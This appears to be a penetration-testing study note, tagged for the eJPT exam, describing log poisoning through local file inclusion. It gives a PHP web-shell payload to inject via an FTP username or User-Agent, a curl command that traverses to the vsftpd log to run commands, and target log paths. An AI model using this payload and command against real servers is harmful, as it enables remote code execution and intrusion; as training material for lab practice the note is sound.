---
type: technique
tags: [ejpt:web-pentest, ejpt:host-net-pentest]
tools: [curl]
cves: []
related: [[local-file-inclusion]]
---

# Log Poisoning

Injecting executable code into a log file, then including that log via [[local-file-inclusion|LFI]] to achieve RCE.

## Workflow

1. Send a request that writes PHP (or other code) into a log:
   - **FTP**: use a crafted username `<?php system($_GET['cmd']); ?>` (failed logins are logged to `/var/log/vsftpd.log`).
   - **HTTP**: poisoned `User-Agent` logged by Apache.
2. Include the log via the LFI parameter and pass a command:

```sh
curl -s "http://TARGET/index.php?param=../../../var/log/vsftpd.log&cmd=id"
```

## Common logs

- `/var/log/vsftpd.log`
- `/var/log/apache2/access.log`

## Seen in

[[hannah-coffee]] (vsftpd log poisoning → reverse shell)
